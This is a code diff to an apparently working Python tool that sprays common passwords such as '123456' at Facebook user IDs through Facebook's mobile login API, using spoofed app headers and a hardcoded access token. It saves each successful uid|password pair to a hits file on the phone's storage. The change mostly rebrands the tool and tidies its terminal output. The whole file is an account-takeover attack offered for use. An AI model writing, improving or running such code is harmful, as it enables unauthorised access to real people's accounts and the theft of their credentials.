@@ -2,16 +2,41 @@ import sys
 import time
 import uuid
 import requests
-from config import oks, loop
-from utils import window1, creationyear
 import config
+from utils import window1, creationyear
+
+# colour shortcuts
+G   = '\x1b[38;5;46m'
+Y   = '\x1b[38;5;220m'
+CY  = '\x1b[38;5;51m'
+W   = '\x1b[1;97m'
+DIM = '\x1b[2;37m'
+R   = '\x1b[38;5;196m'
+RST = '\x1b[0m'
+
+
+def _hit_line(method, uid, pw):
+    year = creationyear(uid)
+    sys.stdout.write(
+        f"\r  {G}✔{RST}  {CY}[KABBO-M{method}]{RST}  "
+        f"{W}{uid}{RST}  {DIM}│{RST}  {Y}{pw}{RST}  {DIM}│{RST}  {G}{year}{RST}\n"
+    )
+    sys.stdout.flush()
+
+
+def _status_line(method):
+    sys.stdout.write(
+        f"\r  {DIM}[KABBO-M{method}]{RST}  "
+        f"Tried {CY}{config.loop}{RST}  │  "
+        f"Hits {G}{len(config.oks)}{RST}   "
+    )
+    sys.stdout.flush()
 
 
 def login_1(uid):
     session = requests.session()
     try:
-        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mRAJA-M1\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;192m{config.loop}\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mOK\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;192m{len(config.oks)}\x1b[38;5;196m]")
-        sys.stdout.flush()
+        _status_line(1)
         for pw in ('123456', '1234567', '12345678', '123456789'):
             data = {
                 'adid': str(uuid.uuid4()),
@@ -34,7 +59,7 @@ def login_1(uid):
                 'method': 'auth.login',
                 'fb_api_req_friendly_name': 'authenticate',
                 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
-                'api_key': '882a8490361da98702bf97a021ddc14d'
+                'api_key': '882a8490361da98702bf97a021ddc14d',
             }
             headers = {
                 'User-Agent': window1(),
@@ -51,17 +76,15 @@ def login_1(uid):
                 'X-FB-HTTP-Engine': 'Liger',
                 'X-FB-Client-IP': 'True',
                 'X-FB-Server-Cluster': 'True',
-                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
+                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
             }
-            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
-            if 'session_key' in res:
-                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRAJA\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/RAJA-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
-                config.oks.append(uid)
-                break
-            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA-M1\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/RAJA-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+            res = session.post(
+                'https://b-graph.facebook.com/auth/login',
+                data=data, headers=headers, allow_redirects=False
+            ).json()
+            if 'session_key' in res or 'www.facebook.com' in res.get('error', {}).get('message', ''):
+                _hit_line(1, uid, pw)
+                open('/sdcard/KABBO-M1-HITS.txt', 'a').write(f"{uid}|{pw}\n")
                 config.oks.append(uid)
                 break
         config.loop += 1
@@ -71,8 +94,7 @@ def login_1(uid):
 
 def login_2(uid):
     from random import randint as rr
-    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{config.loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(config.oks)}\x1b[38;5;196m)")
-
+    _status_line(2)
     for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
         try:
             with requests.Session() as session:
@@ -84,18 +106,24 @@ def login_2(uid):
                     'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                     'user-agent': window1(),
                     'content-type': 'application/x-www-form-urlencoded',
-                    'x-fb-http-engine': 'Liger'
+                    'x-fb-http-engine': 'Liger',
                 }
-                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
+                url = (
+                    f"https://b-api.facebook.com/method/auth.login?format=json"
+                    f"&email={uid}&password={pw}"
+                    f"&credentials_type=device_based_login_password"
+                    f"&generate_session_cookies=1&error_detail_type=button_with_disabled"
+                    f"&source=device_based_login&meta_inf_fbmeta=%20"
+                    f"&currently_logged_in_userid=0&method=GET&locale=en_US"
+                    f"&client_country_code=US"
+                    f"&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler"
+                    f"&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
+                    f"&fb_api_req_friendly_name=authenticate&cpl=true"
+                )
                 po = session.get(url, headers=headers).json()
                 if 'session_key' in str(po):
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRAJA\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/RAJA-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
-                    config.oks.append(uid)
-                    break
-                elif 'session_key' in po:
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/RAJA-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    _hit_line(2, uid, pw)
+                    open('/sdcard/KABBO-M2-HITS.txt', 'a').write(f"{uid}|{pw}\n")
                     config.oks.append(uid)
                     break
         except Exception:
